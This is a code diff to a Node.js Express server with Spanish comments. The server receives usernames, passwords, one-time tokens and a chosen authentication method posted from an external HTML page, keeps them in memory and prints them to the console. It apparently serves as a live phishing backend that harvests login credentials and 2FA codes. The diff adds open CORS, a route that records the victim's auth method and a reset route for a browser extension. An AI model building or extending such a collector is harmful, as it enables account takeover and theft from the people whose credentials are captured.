@@ -1,6 +1,8 @@
 const express = require('express');
+const cors = require('cors'); // Asegúrate de tenerlo instalado: npm install cors
 const app = express();
 
+app.use(cors()); // Permite conexiones desde tu página HTML externa
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 
@@ -9,8 +11,19 @@ let baseDeDatosTemporal = {
     pass: null,
     token: null,
     origen: null,
-    actualizado: false
+    actualizado: false,
+    metodo: null // <--- Nueva propiedad para el método de auth
 };
+
+// --- NUEVA RUTA: RECIBIR MÉTODO DESDE EL HTML ---
+app.post('/metodo', (req, res) => {
+    const { metodo } = req.body;
+    baseDeDatosTemporal.metodo = metodo;
+    console.log("===============================");
+    console.log(`🎯 Método Seleccionado: ${metodo.toUpperCase()}`);
+    console.log("===============================");
+    res.status(200).send("OK");
+});
 
 app.post('/recibir', (req, res) => {
     const { user, pass, token, origen } = req.body;
@@ -35,26 +48,28 @@ app.post('/recibir', (req, res) => {
         pass: pass || baseDeDatosTemporal.pass,
         token: tokenFinal,
         origen: origen,
+        metodo: baseDeDatosTemporal.metodo, // Mantenemos el método guardado
         actualizado: true
     };
 
     console.log("===============================");
     console.log(`👤 Usuario: ${baseDeDatosTemporal.user}`);
     console.log(`📲 Token: ${baseDeDatosTemporal.token === null ? "ESPERANDO..." : baseDeDatosTemporal.token}`);
+    console.log(`🛠️ Método Auth: ${baseDeDatosTemporal.metodo || "NO DEFINIDO"}`);
     console.log("===============================");
 
     res.status(200).send("OK");
 });
 
-
-// --- NUEVA RUTA: LIMPIAR DATOS (AÑADE ESTO AQUÍ) ---
+// --- RUTA: LIMPIAR DATOS ---
 app.post('/limpiar', (req, res) => {
     baseDeDatosTemporal = {
         user: null,
         pass: null,
         token: null,
         origen: null,
-        actualizado: false
+        actualizado: false,
+        metodo: null // También limpiamos el método
     };
     console.log("🧹 Base de datos reseteada por la extensión.");
     res.status(200).send("Limpiado");
